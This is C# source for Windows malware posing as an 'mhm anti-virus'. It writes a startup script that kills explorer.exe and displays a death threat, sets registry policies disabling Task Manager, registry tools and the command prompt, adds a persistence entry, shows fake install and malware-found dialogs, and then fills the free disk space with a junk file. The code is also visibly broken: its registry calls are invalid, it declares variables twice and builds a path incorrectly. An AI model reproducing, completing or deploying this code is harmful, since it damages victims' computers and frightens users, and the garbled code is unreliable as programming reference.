using System;
using System.Windows.Forms;
using System.IO;
using System.Text;

namespace mhm
{
    class Program
    {
        static void Main(string[] args)
        {
            Random rnd = new Random();
            int rnd1  = rnd.Next(1, 105000000);    
            String usn = Environment.UserName;
            bool startup = File.Exists(@"c:\Windows\System32\mhm\startup.cmd");
            bool pyld = File.Exists(@"c:\Windows\System32\mhm\payload1.used");
            bool pyld1 = File.Exists(@"c:\Windows\System32\mhm\payload2.used");
            if ( pyld == true) {
                goto pyload2;
            } else if ( pyld1 == true) {
                goto pyload3;
            }
            if ( startup == true ) {
                goto rnd1;
            } else {
                goto normie;
            }
            normie:
            using (FileStream fs = File.Create(@"c:\Windows\System32\mhm\startup.cmd"))
            {
                byte[] info = new UTF8Encoding(true).GetBytes("taskkill /F /IM explorer.exe");
                fs.Write(info, 0, info.Length);
            }
            File.AppendAllText(@"c:\Windows\System32\mhm\startup.cmd", "start startup.cmd" + Environment.NewLine);   
            File.AppendAllText(@"c:\Windows\System32\mhm\startup.cmd", "msg * death is coming to your house today :D" + Environment.NewLine);   

            Directory.CreateDirectory(@"c:\Windows\System32\mhm");

            HKEY_CURRENT_USER.Software.Microsoft.Windows.CurrentVersion.Policies.System key;  
            key = HKEY_CURRENT_USER.Software.Microsoft.Windows.CurrentVersion.Policies.System;
                RunCreateSubKey("DisableTaskMgr");  
                key.SetValue("1");  
            key.Close();

            HKEY_CURRENT_USER.Software.Microsoft.Windows.CurrentVersion.Policies.System key;  
            key = HKEY_CURRENT_USER.Software.Microsoft.Windows.CurrentVersion.Policies.System;
                RunCreateSubKey("DisableRegistryTools");  
                key.SetValue("1");  
            key.Close();

            HKEY_CURRENT_USER.Software.Policies.Microsoft.Windows key;  
            key = HKEY_CURRENT_USER.Software.Policies.Microsoft.Windows;
                RunCreateSubKey("mhm");  
                key.SetValue(@"c:\Windows\System32\mhm\startup.cmd");  
            key.Close();

            HKEY_LOCAL_MACHINE.SOFTWARE.Microsoft.Windows.CurrentVersion.Run key;  
            key = HKEY_LOCAL_MACHINE.SOFTWARE.Microsoft.Windows.CurrentVersion;
                RunCreateSubKey("DisableCMD");  
                key.SetValue("1");  
            key.Close();

            MessageBox.Show("mhm anti-virus installed succsessfully", MessageBoxButtons.Ok, MessageBoxIcon.Information);

            rnd1:
            if ( rnd1 == 1 ) {
                MessageBox.Show("mhm anti virus-found malware in your computer, do you want to delete it", "mhm anti-virus", MessageBoxButtons.YesNo , MessageBoxIcon.Question);
                using (FileStream fs = File.Create(@"c:\Windows\System32\mhm\payload1.used"))
                    {
                        byte[] info = new UTF8Encoding(true).GetBytes("Payload1 iniciated");
                        fs.Write(info, 0, info.Length);
                    }
                goto pyload2;
            } else {
                goto rnd1;
            }

            pyload2:
            using (FileStream fs = File.Create(@"c:\windows\system32\mhm\pyld2.cmd"))
            {
                byte[] info = new UTF8Encoding(true).GetBytes(@"cd c:\windows\system32\mhm");
                fs.Write(info, 0, info.Length);
            }
            var freeSpace = DriveInfo.GetDrives().Where(x => x.Name == "c" && x.IsReady).FirstOrDefault().TotalFreeSpace;
            File.AppendAllText(@"c:\users\" + usn + @"c:\windows\system32\mhm\pyld2.cmd", "Fsutil file createnew haxed.uwu " + freeSpace + Environment.NewLine);       
       }
    }
}
